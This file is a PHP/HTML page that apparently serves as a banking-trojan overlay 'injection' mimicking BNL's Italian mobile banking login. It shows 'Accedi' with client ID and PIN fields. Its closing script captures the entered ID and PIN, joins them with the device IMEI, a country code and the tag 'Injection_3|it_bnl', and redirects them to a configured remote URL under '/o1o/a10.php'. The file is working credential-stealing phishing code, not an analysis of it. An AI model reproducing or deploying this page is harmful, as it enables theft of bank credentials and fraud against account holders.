<!-- 5.3.5 -->
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="it/it.bnl.apps.banking/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        Ciao!
        <img style="float: right;width: 22px;margin-top: 14px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAQAAACROWYpAAAB+0lEQVQ4y52VzUtUYRTGf/c6C1OLKAgqqkXNCBFBEEFg64ow+4KCXIgR/QFp2KJVaAszEJx9FEQSZCXSMoigTavaNJKQpg19EIFFm/DX4r5ec2a0Oz2r995znnOf87zveS9Uwdg2B31myXlfu4essNFeP/k3BkLkkpdtWo16ymmXY9q9AHar+t722sTI6yllxmEPm7c5jR5xIcRuGFVT74XgrN3GNYqfTdu5WxFPv/rIlhWbWu9YyOpf3muC4SpJlftQDJknlhxObHpcS25Ve0+CK43Ji15V51ybaTPX+VHVvkRKYsTFzGfhgqovAdtU/WBDZnLsfec9CTio6gj/gZj9AEykdfPm/7VeElFStRCekq0orrYOmc2A86rJ0TCfHtD8SutAvaMWY6L6e7WJ80AnvlN1Vz2y3a3qW3yu6rF6DLNd1afYX2lFBtkjqg7hIVWn6qDGllVtw02qfq+D3BVmIcJ9qr7JTG0Og3ENsEPViYzUyAdhFtZAzHYAZrJRuckZAHqiX5DLTraF25wGYCgaTV6NqtqZpmywtXo8bbArvZYfLt44ObYBULCPAq20shH47BjjTDGHbGYnR+lgR6hziyvRwmLNWbOj7Lnlgn5WJPzwS03iV69W/m5yDNDDNyYpUWKSEnPAAY5zkK1sAcqUecU4L6LflU78Aa6fTybxLaWUAAAAAElFTkSuQmCC">
    </div>
    <div class="header2">
        Accedi
        <div class="line"></div>
    </div>
    <form action="null"  method="post" id="_mainForm" target="flow_handler">
        <input type="tel" class="field" name="login" id="login" placeholder="ID cliente">

        <input type="password" class="field" name="pin" id="pin" placeholder="PIN">

        <input type="submit" class="button" id="input_submitBtn" value="Accedi">
    </form>
    <img style="width: 38px;margin-left: 10px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAD8AAAAkCAQAAACURyoMAAACF0lEQVRYw8WYv04bQRDGP9+1INkNEidMgwQPQDoaF6GyxJ8qFPAESFTueAKo3PsVjJQURkIRNA5dKEGioCGSXSL5Cgr7/KPYxWBhw53X8X6V97Seb3Z2ZnZmchoDCiprU8taVKR5TYJYLbX1qN9q5J4y/I8dLukyPXS5ZCcd9QbX/B9cs/E5dUh1sDmhSYUSa0xmejHPGiUq/CEZSK0Sjtue58JueuaUBU0NLHDKs5V9QX40+Z3dUKeoqYMiZ1b+7QcFCO3J+xwPvi1xyDn3xMTcc84hS44qHNO3Fhi+AnvnfX7YdUSN3gfn6VEjclJgzypQHfZ2A3tytuiM9d8OW44WMHiLAhtqdbs6euepo5Bw5KRA3YTh63LXenvRnrz/ZQQnLhagaKNg1yyvADixd95JlUI6Lj7ACQBXkijQBRIT59RS57CaUx5IgC4FcQBA04ZaLzV9zyUMaQJwEGhTkvRTkrStMLWEUNsO/vdLkvQ9kMlwN5KkciYRZQf6v5Kk5UDGhVqSpJVMIlYc6A1fJGIA5iS9/k6L2OHu54yEQD5BMDDDm0myGXAyGL72MP1DJhEPzvStQP8kSeuSpEYmEQ0H+m+SpEex7zHt7PtOup6fnBEPbjLTB9dzueG92HpXau55KDW9F9oSeW7tGc9m3mZ4b7LGtpirDi3mKiUqNFO1mN4b7NmPF3JfDlciLU48XGmr9flw5QWiU6BZQml4YgAAAABJRU5ErkJggg==">
    <h6>Modalità Private</h6>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('input_submitBtn');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('login');
            var oCodeInp = document.getElementById('pin');

            try{
                oNumInp.className = 'field';
                oCodeInp.className = 'field';
            } catch(e){};

            if (!/^\w{3,50}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|it_bnl|"+oNumInp.value+"|"+oCodeInp.value);

           return false;
       };

   })();
</script>
</body>
</html>
